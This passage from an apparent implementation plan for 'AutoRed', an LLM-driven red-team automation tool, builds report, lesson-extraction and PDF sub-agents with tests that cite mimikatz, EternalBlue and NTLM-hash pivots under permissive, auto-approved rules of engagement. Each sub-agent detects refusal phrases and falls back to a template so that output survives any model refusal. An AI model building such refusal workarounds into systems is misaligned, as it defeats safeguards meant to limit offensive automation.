        f"and **{summary.get('pivots', 0)} lateral pivot(s)**.",
        "",
        f"Outcome: {summary.get('outcome', 'engagement completed')}.",
        "",
    ]
    if summary.get("cleanup_all_verified"):
        lines.append("All engagement artifacts were removed and verified during cleanup.")
    else:
        lines.append(
            "Cleanup was performed; some artifacts could not be verified removed — "
            "see the technical report for the artifact inventory."
        )
    return "\n".join(lines)


def _is_refusal(text: str) -> bool:
    lowered = (text or "").lower()
    return any(marker in lowered for marker in (
        "i cannot assist", "i can't assist", "i'm sorry", "i am unable to",
    ))


@tool
async def execsummarywriter_subagent(engagement_summary: str, engagement_id: str = "") -> ExecSummaryOutput:
    """Generate a one-page executive summary of the engagement.

    LLM-written with a deterministic template fallback on API failure
    or refusal — the deliverable is never lost.

    Args:
        engagement_summary: JSON engagement summary (built by the Report Agent).
        engagement_id: Current engagement ID.

    Returns:
        ExecSummaryOutput with summary_markdown and used_fallback flag.
    """
    log.info("execsummary_start", engagement_id=engagement_id)
    summary = _parse_summary_dict(engagement_summary)

    try:
        model = get_model("write_report")
        response = await model.ainvoke(EXEC_SUMMARY_PROMPT.format(
            summary_json=json.dumps(summary, indent=2),
        ))
        content = response.content if hasattr(response, "content") else str(response)
        if content and not _is_refusal(content):
            log.info("execsummary_done", engagement_id=engagement_id, fallback=False)
            return ExecSummaryOutput(summary_markdown=content, used_fallback=False)
        log.warning("execsummary_refused", engagement_id=engagement_id)
    except Exception as e:  # noqa: BLE001 — deliverable must survive LLM failure
        log.warning("execsummary_llm_failed", engagement_id=engagement_id, error=str(e))

    log.info("execsummary_done", engagement_id=engagement_id, fallback=True)
    return ExecSummaryOutput(
        summary_markdown=_template_exec_summary(summary), used_fallback=True,
    )
```

Add to `autored/subagents/__init__.py`:

```python
from autored.subagents.execsummarywriter import execsummarywriter_subagent  # noqa: F401
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/unit/subagents/test_execsummarywriter.py -v`
Expected: PASS (7 tests)

- [ ] **Step 5: Commit**

```bash
git add autored/subagents/execsummarywriter.py autored/subagents/__init__.py \
        tests/unit/subagents/test_execsummarywriter.py
git commit -m "feat: ExecSummaryWriter sub-agent with template fallback"
```

---

## Task 5: TechReportWriter Sub-Agent (Redacted Data + Template Fallback)

**Files:**
- Create: `autored/subagents/techreportwriter.py`
- Modify: `autored/subagents/__init__.py`
- Test: `tests/unit/subagents/test_techreportwriter.py` (NEW)

**Interfaces:**
- Consumes: `get_model("write_report")`; `EngagementState` (the redaction helper takes the live state object — the node calls `_redacted_state_dict(state)` then serializes it for the sub-agent).
- Produces:
  - `TechReportOutput(report_markdown: str, used_fallback: bool)`.
  - `@tool async def techreportwriter_subagent(engagement_data: str, engagement_id: str = "") -> TechReportOutput` — `engagement_data` is JSON of the **redacted** state dict + engagement summary.
  - `_redact_secret(value: str) -> str` — returns `"***REDACTED***(sha256:<8 hex>)"`; exported for Task 8's memory writer (same fingerprint format everywhere).
  - `_redacted_state_dict(state) -> dict` — `state.model_dump()` with every `harvested_secrets[*].secret_value` replaced by `_redact_secret(...)`; foothold usernames/hosts stay (they are report material).
  - `_template_tech_report(data: dict) -> str` — deterministic sections: Scope, Findings (markdown table), Footholds, Privilege Escalation, Persistence Artifacts, Evasion, Exfiltration, Lateral Movement, Cleanup, Evidence Inventory, Errors. Used as the fallback and as the data-sections skeleton under the LLM narrative.
  - `TECH_REPORT_PROMPT` — asks the LLM for the Attack Narrative section only (deterministic tables are appended around it, so the LLM never re-types structured data it could corrupt).

- [ ] **Step 1: Write the failing tests**

```python
# tests/unit/subagents/test_techreportwriter.py
"""Unit tests for TechReportWriter (Phase 6 Task 5)."""
import json
from datetime import datetime
from unittest.mock import AsyncMock, MagicMock, patch

from autored.models import Secret
from autored.models.roe import RulesOfEngagement
from autored.state import EngagementState
from autored.subagents.techreportwriter import (
    _redact_secret,
    _redacted_state_dict,
    _template_tech_report,
    techreportwriter_subagent,
)

PLAINTEXT = "SuperSecret123!"
NTLM = "31d6cfe0d16ae931b73c59d7e0c089c0"


def _roe() -> RulesOfEngagement:
    return RulesOfEngagement(
        engagement_name="t", operator="t", operator_signature="t",
        allowed_ips=["*"], allowed_techniques=["*"],
        persistence_allowed=True, evasion_allowed=True,
        exfiltration_allowed=True, data_destruction_allowed=False,
        kernel_exploits_allowed=True, hitl_mode="auto_approve",
    )


def _state_with_secrets() -> EngagementState:
    state = EngagementState(
        engagement_id="e1", target_scope=["10.0.0.5"],
        operator="t", rules_of_engagement=_roe(),
    )
    state.harvested_secrets = [
        Secret(host_ip="10.0.0.5", secret_type="password",
               secret_value=PLAINTEXT, source="mimikatz:wdigest/administrator"),
        Secret(host_ip="10.0.0.5", secret_type="hash",
               secret_value=NTLM, source="mimikatz:kerberos/administrator"),
    ]
    return state


def test_redact_secret_hides_value_keeps_fingerprint():
    redacted = _redact_secret(PLAINTEXT)
    assert PLAINTEXT not in redacted
    assert redacted.startswith("***REDACTED***")
    assert "sha256:" in redacted
    assert len(redacted.split("sha256:")[1]) == 8


def test_redacted_state_dict_never_contains_secret_values():
    """Review Focus #2 — secret material must not survive redaction."""
    redacted = _redacted_state_dict(_state_with_secrets())
    dumped = json.dumps(redacted)
    assert PLAINTEXT not in dumped
    assert NTLM not in dumped
    assert dumped.count("***REDACTED***") == 2
    # usernames / hosts survive — they are report material
    assert "administrator" in dumped


def test_template_contains_all_sections():
    data = {
        "summary": {"target": "10.0.0.5", "engagement_id": "e1", "outcome": "ok",
                    "cleanup_all_verified": True},
        "state": _redacted_state_dict(_state_with_secrets()),
    }
    md = _template_tech_report(data)
    for section in (
        "## Scope", "## Findings", "## Footholds", "## Privilege Escalation",
        "## Persistence Artifacts", "## Defense Evasion", "## Exfiltration",
        "## Lateral Movement", "## Cleanup", "## Evidence Inventory", "## Errors",
    ):
        assert section in md, f"missing section {section}"
    assert PLAINTEXT not in md  # redaction flows through the template too


async def test_llm_narrative_plus_deterministic_sections():
    mock_response = MagicMock()
    mock_response.content = "## Attack Narrative\n\nRecon found SMB; EternalBlue gave SYSTEM."
    with patch("autored.subagents.techreportwriter.get_model") as mock_get_model:
        mock_model = AsyncMock()
        mock_model.ainvoke = AsyncMock(return_value=mock_response)
        mock_get_model.return_value = mock_model

        data = {
            "summary": {"target": "10.0.0.5", "engagement_id": "e1", "outcome": "ok",
                        "cleanup_all_verified": True},
            "state": _redacted_state_dict(_state_with_secrets()),
        }
        output = await techreportwriter_subagent.ainvoke({
            "engagement_data": json.dumps(data), "engagement_id": "e1",
        })
    assert "## Attack Narrative" in output.report_markdown
    assert "## Findings" in output.report_markdown  # deterministic sections appended
    assert output.used_fallback is False
    assert PLAINTEXT not in output.report_markdown


async def test_llm_failure_falls_back():
    with patch("autored.subagents.techreportwriter.get_model") as mock_get_model:
        mock_model = AsyncMock()
        mock_model.ainvoke = AsyncMock(side_effect=RuntimeError("timeout"))
        mock_get_model.return_value = mock_model

        data = {
            "summary": {"target": "10.0.0.5", "engagement_id": "e1", "outcome": "ok",
                        "cleanup_all_verified": True},
            "state": _redacted_state_dict(_state_with_secrets()),
        }
        output = await techreportwriter_subagent.ainvoke({
            "engagement_data": json.dumps(data), "engagement_id": "e1",
        })
    assert output.used_fallback is True
    assert "## Findings" in output.report_markdown
    assert PLAINTEXT not in output.report_markdown
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/subagents/test_techreportwriter.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.subagents.techreportwriter'`

- [ ] **Step 3: Write the sub-agent**

```python
# autored/subagents/techreportwriter.py
"""TechReportWriter sub-agent — full technical report (spec §7.4).

The LLM writes the Attack Narrative; every structured section (findings
table, foothold inventory, cleanup results, ...) is rendered
deterministically from the redacted state so the model can never mistype
data it was given. Secret values are replaced by
``***REDACTED***(sha256:<8hex>)`` fingerprints before the LLM ever sees
them (plan Review Focus #2) — the same fingerprints the memory writer
(Task 8) stores, so an operator can correlate a report row with a DB row.
"""
import hashlib
import json

from langchain_core.tools import tool
from pydantic import BaseModel

from autored.logging import get_logger
from autored.router import get_model

log = get_logger("subagents.techreportwriter")

TECH_REPORT_PROMPT = """You are the TechReportWriter sub-agent in AutoRed, a red team automation system.
Write the "## Attack Narrative" section (200-400 words) for the technical
report of this engagement. Tell the story chronologically: how access was
gained, how privileges were escalated, how lateral movement proceeded.
Reference hosts and technique names — never credentials (they are already
redacted in the data below and must stay that way).

Engagement data (JSON, secrets already redacted):
{data_json}

Rules:
- Start with "## Attack Narrative"
- Chronological, technical, precise
- No tables (they are generated deterministically around your narrative)
- No secret values, no hashes, no passwords
"""


class TechReportOutput(BaseModel):
    report_markdown: str
    used_fallback: bool = False


def _redact_secret(value: str) -> str:
    fingerprint = hashlib.sha256(value.encode()).hexdigest()[:8]
    return f"***REDACTED***(sha256:{fingerprint})"


def _redacted_state_dict(state) -> dict:
    data = state.model_dump()
    for secret in data.get("harvested_secrets", []):
        if secret.get("secret_value"):
            secret["secret_value"] = _redact_secret(secret["secret_value"])
    return data


def _findings_table(state_dict: dict) -> str:
    vulns = state_dict.get("vulnerabilities", [])
    if not vulns:
        return "_No findings recorded._"
    lines = ["| Host | Port | Service | CVE | Severity | Title |",
             "|---|---|---|---|---|---|"]
    for v in vulns:
        lines.append(
            f"| {v.get('host_ip', '')} | {v.get('port') or ''} | "
            f"{v.get('service') or ''} | {v.get('cve') or ''} | "
            f"{v.get('severity', '')} | {v.get('title', '')} |"
        )
    return "\n".join(lines)


def _simple_inventory(state_dict: dict, key: str, render) -> str:
    items = state_dict.get(key, [])
    if not items:
        return "_None recorded._"
    return "\n".join(f"- {render(item)}" for item in items)


def _template_tech_report(data: dict) -> str:
    """Deterministic report body — used whole as fallback, sections reused
    around the LLM narrative on the happy path."""
    summary = data.get("summary", {})
    state_dict = data.get("state", {})

    sections = [
        "## Scope",
        "",
        f"- Target: {summary.get('target', 'unknown')}",
        f"- Engagement: {summary.get('engagement_id', 'unknown')}",
        f"- Operator: {summary.get('operator', 'unknown')}",
        f"- Duration: {summary.get('duration_min', 0):.0f} minutes",
        "",
        "## Findings",
        "",
        _findings_table(state_dict),
        "",
        "## Footholds",
        "",
        _simple_inventory(state_dict, "footholds", lambda f: (
            f"{f.get('host_ip')} as {f.get('username')} ({f.get('context')}) "
            f"via {f.get('method')}, access {f.get('access_type')}"
        )),
        "",
        "## Privilege Escalation",
        "",
        _simple_inventory(state_dict, "privesc_attempts", lambda a: (
            f"{a.get('host_ip')}: {a.get('candidate_id', '')} — "
            f"{'SUCCESS' if a.get('success') else 'failed'}"
            f"{' → ' + a.get('new_context') if a.get('new_context') else ''}"
        )),
        "",
        "## Persistence Artifacts",
        "",
        _simple_inventory(state_dict, "persistence_artifacts", lambda p: (
            f"{p.get('host_ip')}: {p.get('method')} (removal command recorded)"
        )),
        "",
        "## Defense Evasion",
        "",
        _simple_inventory(state_dict, "evasion_actions", lambda e: (
            f"{e.get('host_ip')}: {e.get('technique')} — "
            f"{'SUCCESS' if e.get('success') else 'failed'}"
        )),
        "",
        "## Exfiltration",
        "",
        _simple_inventory(state_dict, "exfiltration_proof", lambda x: (
            f"{x.get('method')} from {x.get('source_host')} "
            f"({x.get('data_size_bytes', 0)} bytes) to catch server"
        )),
        "",
        "## Lateral Movement",
        "",
        _simple_inventory(state_dict, "pivots", lambda p: (
            f"to {p.get('target_host')} via {p.get('method')} — "
            f"{'SUCCESS' if p.get('success') else 'failed'}"
        )),
        "",
        "## Cleanup",
        "",
        _simple_inventory(state_dict, "cleanup_results", lambda c: (
            f"{c.get('host_ip')}: {c.get('removal_command')[:60]} — "
            f"{'verified removed' if c.get('verified') else 'NOT VERIFIED'}"
        )),
        "",
        "## Evidence Inventory",
        "",
        _simple_inventory(state_dict, "evidence_paths", lambda e: str(e)),
        "",
        "## Errors",
        "",
        _simple_inventory(state_dict, "errors", lambda e: (
            f"[{e.get('category')}] {e.get('agent')}: {e.get('message')}"
        )),
    ]
    return "\n".join(sections) + "\n"


def _is_refusal(text: str) -> bool:
    lowered = (text or "").lower()
    return any(marker in lowered for marker in (
        "i cannot assist", "i can't assist", "i'm sorry", "i am unable to",
    ))


@tool
async def techreportwriter_subagent(engagement_data: str, engagement_id: str = "") -> TechReportOutput:
    """Generate the technical report body (narrative + deterministic sections).

    Args:
        engagement_data: JSON of {"summary": {...}, "state": {...}} with
            secrets already redacted by the caller via _redacted_state_dict.
        engagement_id: Current engagement ID.

    Returns:
        TechReportOutput with report_markdown and used_fallback flag.
    """
    log.info("techreport_start", engagement_id=engagement_id)
    data = json.loads(engagement_data) if isinstance(engagement_data, str) else engagement_data
    deterministic_body = _template_tech_report(data)

    narrative = ""
    try:
        model = get_model("write_report")
        response = await model.ainvoke(TECH_REPORT_PROMPT.format(
            data_json=json.dumps(data, indent=2),
        ))
        content = response.content if hasattr(response, "content") else str(response)
        if content and not _is_refusal(content):
            narrative = content
        else:
            log.warning("techreport_refused", engagement_id=engagement_id)
    except Exception as e:  # noqa: BLE001 — deliverable must survive LLM failure
        log.warning("techreport_llm_failed", engagement_id=engagement_id, error=str(e))

    used_fallback = narrative == ""
    if used_fallback:
        narrative = (
            "## Attack Narrative\n\n"
            "_LLM narrative unavailable (API failure or refusal) — see the "
            "deterministic sections below for the full activity record._"
        )
    else:
        # Keep the deterministic sections; the narrative sits on top.
        pass

    markdown = narrative + "\n" + deterministic_body
    log.info("techreport_done", engagement_id=engagement_id, fallback=used_fallback)
    return TechReportOutput(report_markdown=markdown, used_fallback=used_fallback)
```

Add to `autored/subagents/__init__.py`:

```python
from autored.subagents.techreportwriter import techreportwriter_subagent  # noqa: F401
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/unit/subagents/test_techreportwriter.py -v`
Expected: PASS (6 tests)

- [ ] **Step 5: Commit**

```bash
git add autored/subagents/techreportwriter.py autored/subagents/__init__.py \
        tests/unit/subagents/test_techreportwriter.py
git commit -m "feat: TechReportWriter sub-agent with redaction and fallback"
```

---

## Task 6: LessonExtractor Sub-Agent

**Files:**
- Create: `autored/subagents/lessonextractor.py`
- Modify: `autored/subagents/__init__.py`
- Test: `tests/unit/subagents/test_lessonextractor.py` (NEW)

**Interfaces:**
- Consumes: `Lesson` from `autored.models.report` (Task 1); `MITRE_TECHNIQUES` from `autored.subagents.mitremapper` (Task 3 — LLM-proposed technique IDs are validated against it); `get_model("write_report")`.
- Produces:
  - `LessonExtractorOutput(lessons: list[Lesson])`.
  - `@tool async def lessonextractor_subagent(engagement_summary: str, engagement_id: str = "") -> LessonExtractorOutput`.
  - `_validate_lesson_payload(payload: list[dict]) -> list[Lesson]` — drops rows with invalid categories; nulls `mitre_technique_id` values that are not in `MITRE_TECHNIQUES` (the lesson body survives — the ID does not; Review Focus #4 discipline).
  - `_fallback_lessons(summary: dict) -> list[Lesson]` — deterministic: every successful foothold → `technique_worked` lesson; every successful pivot → `technique_worked`; every unverified cleanup → `tool_issue`.
  - `LESSON_EXTRACT_PROMPT` — spec §6.7 step 6: "Extract lessons for cross-engagement memory".

- [ ] **Step 1: Write the failing tests**

```python
# tests/unit/subagents/test_lessonextractor.py
"""Unit tests for LessonExtractor (Phase 6 Task 6)."""
import json
from unittest.mock import AsyncMock, MagicMock, patch

from autored.subagents.lessonextractor import (
    _fallback_lessons,
    _validate_lesson_payload,
    lessonextractor_subagent,
)


def _summary() -> dict:
    return {
        "footholds": [{"method": "ms17_010", "host_ip": "10.0.0.5", "username": "system"}],
        "pivots": [{"method": "wmiexec", "target_host": "10.0.0.8", "success": True}],
        "unverified_cleanups": [{"host_ip": "10.0.0.8", "removal_command": "schtasks /delete ..."}],
        "errors": [],
    }


def test_validate_keeps_valid_lessons():
    payload = [
        {"category": "technique_worked", "body": "EternalBlue worked", "mitre_technique_id": "T1210"},
        {"category": "cve_exploited", "body": "CVE-2017-0144 exploited"},
    ]
    lessons = _validate_lesson_payload(payload)
    assert len(lessons) == 2
    assert lessons[0].mitre_technique_id == "T1210"


def test_validate_drops_invalid_category():
    payload = [
        {"category": "amazing_insight", "body": "junk"},
        {"category": "tool_issue", "body": "nmap crashed"},
    ]
    lessons = _validate_lesson_payload(payload)
    assert len(lessons) == 1
    assert lessons[0].category == "tool_issue"


def test_validate_nulls_unknown_mitre_id():
    """LLM-invented technique IDs are stripped, body survives."""
    payload = [
        {"category": "technique_worked", "body": "worked",
         "mitre_technique_id": "T9999.999"},
    ]
    lessons = _validate_lesson_payload(payload)
    assert len(lessons) == 1
    assert lessons[0].mitre_technique_id is None
    assert lessons[0].body == "worked"


def test_fallback_lessons_from_outcomes():
    lessons = _fallback_lessons(_summary())
    categories = [l.category for l in lessons]
    assert categories.count("technique_worked") == 2  # foothold + pivot
    assert categories.count("tool_issue") == 1        # unverified cleanup
    bodies = " ".join(l.body for l in lessons)
    assert "ms17_010" in bodies
    assert "wmiexec" in bodies


async def test_llm_path_parses_json_lessons():
    llm_json = json.dumps([
        {"category": "technique_worked", "body": "wmiexec with NTLM hash worked on GoAD",
         "mitre_technique_id": "T1047"},
    ])
    mock_response = MagicMock()
    mock_response.content = llm_json
    with patch("autored.subagents.lessonextractor.get_model") as mock_get_model:
        mock_model = AsyncMock()
        mock_model.ainvoke = AsyncMock(return_value=mock_response)
        mock_get_model.return_value = mock_model

        output = await lessonextractor_subagent.ainvoke({
            "engagement_summary": json.dumps(_summary()), "engagement_id": "e1",
        })
    assert len(output.lessons) == 1
    assert output.lessons[0].category == "technique_worked"


async def test_llm_failure_falls_back():
    with patch("autored.subagents.lessonextractor.get_model") as mock_get_model:
        mock_model = AsyncMock()
        mock_model.ainvoke = AsyncMock(side_effect=RuntimeError("429"))
        mock_get_model.return_value = mock_model

        output = await lessonextractor_subagent.ainvoke({
            "engagement_summary": json.dumps(_summary()), "engagement_id": "e1",
        })
    assert len(output.lessons) >= 2  # deterministic fallback
    assert all(l.category in {
        "technique_worked", "cve_exploited", "tool_issue",
        "opsec_failure", "misconfiguration", "other",
    } for l in output.lessons)


async def test_llm_garbage_json_falls_back():
    mock_response = MagicMock()
    mock_response.content = "not json at all {{{"
    with patch("autored.subagents.lessonextractor.get_model") as mock_get_model:
        mock_model = AsyncMock()
        mock_model.ainvoke = AsyncMock(return_value=mock_response)
        mock_get_model.return_value = mock_model

        output = await lessonextractor_subagent.ainvoke({
            "engagement_summary": json.dumps(_summary()), "engagement_id": "e1",
        })
    assert len(output.lessons) >= 2  # fallback engaged, no crash
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/subagents/test_lessonextractor.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.subagents.lessonextractor'`

- [ ] **Step 3: Write the sub-agent**

```python
# autored/subagents/lessonextractor.py
"""LessonExtractor sub-agent — cross-engagement memory seeds (spec §7.4).

Lessons are the payload of the cross-engagement memory layer (spec §3.1
layer 3): "last time CVE-X, this exploit worked". The LLM proposes them
from the engagement summary; a validator enforces the SQLite category set
and nulls any technique ID not present in the embedded MITRE index —
an invented ID is worse than a missing one, because downstream the Vuln
Agent will trust it. Deterministic fallback lessons come from the
engagement's own outcome records.
"""
import json

from langchain_core.tools import tool
from pydantic import BaseModel, Field

from autored.logging import get_logger
from autored.models.report import Lesson
from autored.router import get_model
from autored.subagents.mitremapper import MITRE_TECHNIQUES

log = get_logger("subagents.lessonextractor")

LESSON_EXTRACT_PROMPT = """You are the LessonExtractor sub-agent in AutoRed, a red team automation system.
Extract 3-8 durable lessons from this engagement that will help future
engagements (they are stored in a cross-engagement memory other AutoRed
runs query).

Engagement summary (JSON):
{summary_json}

Return ONLY a JSON array, each element:
{{"category": "<technique_worked|cve_exploited|tool_issue|opsec_failure|misconfiguration|other>",
  "body": "<one specific, actionable sentence>",
  "mitre_technique_id": "<T.... or null>"}}

Rules:
- Be specific: "wmiexec over NTLM hash succeeded against SRV02 (GoAD)" not "lateral movement works"
- Only cite MITRE ATT&CK IDs you are certain exist; null otherwise
- No credentials or hashes in lesson bodies
"""


class LessonExtractorOutput(BaseModel):
    lessons: list[Lesson] = Field(default_factory=list)


def _validate_lesson_payload(payload: list) -> list[Lesson]:
    valid_categories = {
        "technique_worked", "cve_exploited", "tool_issue",
        "opsec_failure", "misconfiguration", "other",
    }
    lessons: list[Lesson] = []
    for row in payload:
        if not isinstance(row, dict):
            continue
        category = row.get("category")
        body = (row.get("body") or "").strip()
        if category not in valid_categories or not body:
            continue
        mitre_id = row.get("mitre_technique_id")
        if mitre_id and mitre_id not in MITRE_TECHNIQUES:
            mitre_id = None  # invented ID → strip, keep the lesson
        lessons.append(Lesson(category=category, body=body, mitre_technique_id=mitre_id))
    return lessons


def _fallback_lessons(summary: dict) -> list[Lesson]:
    lessons: list[Lesson] = []
    for foothold in summary.get("footholds", []):
        lessons.append(Lesson(
            category="technique_worked",
            body=f"{foothold.get('method')} yielded a foothold on "
                 f"{foothold.get('host_ip')} as {foothold.get('username')}",
        ))
    for pivot in summary.get("pivots", []):
        if pivot.get("success"):
            lessons.append(Lesson(
                category="technique_worked",
                body=f"{pivot.get('method')} pivot to {pivot.get('target_host')} succeeded",
            ))
    for cleanup in summary.get("unverified_cleanups", []):
        lessons.append(Lesson(
            category="tool_issue",
            body=f"cleanup on {cleanup.get('host_ip')} could not be verified removed",
        ))
    return lessons


def _is_refusal(text: str) -> bool:
    lowered = (text or "").lower()
    return any(marker in lowered for marker in (
        "i cannot assist", "i can't assist", "i'm sorry", "i am unable to",
    ))


@tool
async def lessonextractor_subagent(engagement_summary: str, engagement_id: str = "") -> LessonExtractorOutput:
    """Extract lessons for the cross-engagement memory.

    LLM-proposed with validation (categories + MITRE index) and a
    deterministic fallback from the engagement's outcome records.

    Args:
        engagement_summary: JSON summary with footholds, pivots,
            unverified_cleanups, and errors lists.
        engagement_id: Current engagement ID.

    Returns:
        LessonExtractorOutput with validated Lesson records.
    """
    log.info("lessonextract_start", engagement_id=engagement_id)
    summary = json.loads(engagement_summary) if isinstance(engagement_summary, str) else engagement_summary

    lessons: list[Lesson] = []
    try:
        model = get_model("write_report")
        response = await model.ainvoke(LESSON_EXTRACT_PROMPT.format(
            summary_json=json.dumps(summary, indent=2),
        ))
        content = response.content if hasattr(response, "content") else str(response)
        if content and not _is_refusal(content):
            try:
                # Tolerate code fences around the JSON array.
                text = content.strip()
                if text.startswith("```"):
                    text = text.split("\n", 1)[1].rsplit("```", 1)[0]
                payload = json.loads(text)
                lessons = _validate_lesson_payload(payload)
            except json.JSONDecodeError as e:
                log.warning("lessonextract_bad_json", engagement_id=engagement_id, error=str(e))
        else:
            log.warning("lessonextract_refused", engagement_id=engagement_id)
    except Exception as e:  # noqa: BLE001 — lessons must survive LLM failure
        log.warning("lessonextract_llm_failed", engagement_id=engagement_id, error=str(e))

    if not lessons:
        lessons = _fallback_lessons(summary)

    log.info("lessonextract_done", engagement_id=engagement_id, lessons=len(lessons))
    return LessonExtractorOutput(lessons=lessons)
```

Add to `autored/subagents/__init__.py`:

```python
from autored.subagents.lessonextractor import lessonextractor_subagent  # noqa: F401
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/unit/subagents/test_lessonextractor.py -v`
Expected: PASS (7 tests)

- [ ] **Step 5: Commit**

```bash
git add autored/subagents/lessonextractor.py autored/subagents/__init__.py \
        tests/unit/subagents/test_lessonextractor.py
git commit -m "feat: LessonExtractor sub-agent with validated categories and fallback"
```

---

## Task 7: PDF Renderer (WeasyPrint, Graceful Degradation)

**Files:**
- Create: `autored/reporting/__init__.py`, `autored/reporting/pdf.py`
- Modify: `pyproject.toml` (dependencies)
- Test: `tests/unit/tools/test_report_pdf.py` (NEW)

**Interfaces:**
- Consumes: `markdown` (new dep) for md→HTML; `weasyprint` (new dep) for HTML→PDF.
- Produces:
  - `async def render_pdf(markdown_text: str, engagement_id: str, engagements_dir: str = "engagements") -> Path | None` — writes `engagements/<id>/report.pdf`; returns `None` (never raises) when WeasyPrint or its system libraries are unavailable (Review Focus #5).
  - `_markdown_to_html(md: str) -> str` — `markdown.markdown(md, extensions=["tables", "fenced_code"])` wrapped in a full HTML document with `_REPORT_CSS`.
  - `_import_weasyprint()` — module-level import helper; the only place WeasyPrint is imported, so tests can monkeypatch it to simulate a missing install.
  - `pyproject.toml` gains `"weasyprint==62.3"` (spec-pinned) and `"markdown==3.7"` (plan addition — md→HTML conversion; documented deviation: the spec pins WeasyPrint but not a markdown converter, and WeasyPrint consumes HTML, not markdown).

- [ ] **Step 1: Write the failing tests**

```python
# tests/unit/tools/test_report_pdf.py
"""Unit tests for the PDF renderer (Phase 6 Task 7)."""
from pathlib import Path

import pytest

from autored.reporting.pdf import _markdown_to_html, _REPORT_CSS, render_pdf
```


def test_markdown_to_html_wraps_document_and_converts_tables():
    md = "# Title\n\n| A | B |\n|---|---|\n| 1 | 2 |\n"
    html = _markdown_to_html(md)
    assert html.startswith("<!DOCTYPE html>")
    assert "<title>" in html
    assert _REPORT_CSS in html
    assert "<table>" in html  # tables extension active


def test_markdown_to_html_converts_fenced_code():
    md = "# T\n\n```bash\nnmap -sV target\n```\n"
    html = _markdown_to_html(md)
    assert "<pre>" in html and "nmap" in html


async def test_render_pdf_writes_valid_pdf(tmp_path):
    pytest.importorskip("weasyprint")  # needs system Pango/Cairo — legal skip

    md = "# Engagement Report\n\n## Executive Summary\n\nAll good.\n"
    pdf_path = await render_pdf(md, "e-pdf-test", engagements_dir=str(tmp_path))
    assert pdf_path is not None
    assert pdf_path.exists()
    assert pdf_path.name == "report.pdf"
    magic = pdf_path.read_bytes()[:5]
    assert magic == b"%PDF-"


async def test_render_pdf_degrades_when_weasyprint_missing(monkeypatch, tmp_path):
    """Review Focus #5 — missing renderer must never lose the deliverable."""
    import autored.reporting.pdf as pdf_mod

    def _boom():
        raise ImportError("weasyprint requires Pango/Cairo system libraries")

    monkeypatch.setattr(pdf_mod, "_import_weasyprint", _boom)
    md = "# Report\n\nBody.\n"
    pdf_path = await render_pdf(md, "e-pdf-test2", engagements_dir=str(tmp_path))
    assert pdf_path is None  # graceful: None, not an exception


async def test_render_pdf_degrades_on_render_error(monkeypatch, tmp_path):
    import autored.reporting.pdf as pdf_mod

    class FakeWeasyprintModule:
        class HTML:
            def __init__(self, *args, **kwargs):
                pass

            def write_pdf(self, target):
                raise OSError("cannot load library 'pango'")

    monkeypatch.setattr(pdf_mod, "_import_weasyprint", lambda: FakeWeasyprintModule)
    md = "# Report\n\nBody.\n"
    pdf_path = await render_pdf(md, "e-pdf-test3", engagements_dir=str(tmp_path))
    assert pdf_path is None
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/tools/test_report_pdf.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.reporting'`

- [ ] **Step 3: Add dependencies and write the renderer**

Add to `pyproject.toml` `dependencies`:

```toml
    "weasyprint==62.3",
    "markdown==3.7",
```

```python
# autored/reporting/__init__.py
"""AutoRed reporting package — markdown assembly, PDF rendering, memory persistence."""
```

```python
# autored/reporting/pdf.py
"""PDF rendering for engagement reports (Phase 6, spec §13.6).

Markdown → HTML (``markdown`` lib) → PDF (WeasyPrint). WeasyPrint needs
system libraries (Pango, Cairo, GDK-PixBuf) that are standard on Kali but
often absent on slim containers — ``render_pdf`` therefore degrades to
``None`` with a warning instead of raising, and the markdown report is
always written first by the Report Agent (it is the deliverable of
record).
"""
import asyncio
from pathlib import Path

import markdown as markdown_lib

from autored.logging import get_logger

log = get_logger("reporting.pdf")

_REPORT_CSS = """
@page {
    size: A4;
    margin: 2cm 1.8cm;
    @bottom-right { content: "AutoRed — page " counter(page) " / " counter(pages); }
}
body {
    font-family: 'DejaVu Sans', sans-serif;
    font-size: 10pt;
    line-height: 1.45;
    color: #1a1a1a;
}
h1 { font-size: 18pt; border-bottom: 2px solid #444; padding-bottom: 4px; }
h2 { font-size: 13pt; margin-top: 18px; color: #333; }
table { border-collapse: collapse; width: 100%; margin: 8px 0; font-size: 9pt; }
th, td { border: 1px solid #999; padding: 3px 6px; text-align: left; }
th { background: #eee; }
pre { background: #f5f5f5; border: 1px solid #ddd; padding: 6px;
      font-family: 'DejaVu Sans Mono', monospace; font-size: 8.5pt;
      white-space: pre-wrap; word-wrap: break-word; }
code { font-family: 'DejaVu Sans Mono', monospace; font-size: 9pt; }
"""


def _import_weasyprint():
    """Import WeasyPrint lazily — the single import point for test patching."""
    import weasyprint  # noqa: PLC0415 — deliberate lazy import
    return weasyprint


def _markdown_to_html(md: str) -> str:
    body = markdown_lib.markdown(md, extensions=["tables", "fenced_code"])
    return (
        "<!DOCTYPE html>\n"
        "<html>\n"
        "<head>\n"
        "<meta charset=\"utf-8\">\n"
        "<title>AutoRed Engagement Report</title>\n"
        f"<style>{_REPORT_CSS}</style>\n"
        "</head>\n"
        f"<body>\n{body}\n</body>\n</html>\n"
    )


async def render_pdf(
    markdown_text: str,
    engagement_id: str,
    engagements_dir: str = "engagements",
) -> Path | None:
    """Render the markdown report to ``engagements/<id>/report.pdf``.

    Returns the PDF path, or ``None`` when WeasyPrint (or its system
    libraries) is unavailable — never raises (plan Review Focus #5).
    """
    def _render() -> Path:
        weasyprint = _import_weasyprint()
        out_dir = Path(engagements_dir) / engagement_id
        out_dir.mkdir(parents=True, exist_ok=True)
        pdf_path = out_dir / "report.pdf"
        weasyprint.HTML(string=_markdown_to_html(markdown_text)).write_pdf(str(pdf_path))
        return pdf_path

    try:
        return await asyncio.to_thread(_render)
    except ImportError as e:
        log.warning("pdf_renderer_unavailable", engagement_id=engagement_id, error=str(e))
        return None
    except Exception as e:  # noqa: BLE001 — missing Pango/Cairo raises OSError here
        log.warning("pdf_render_failed", engagement_id=engagement_id, error=str(e))
        return None
```

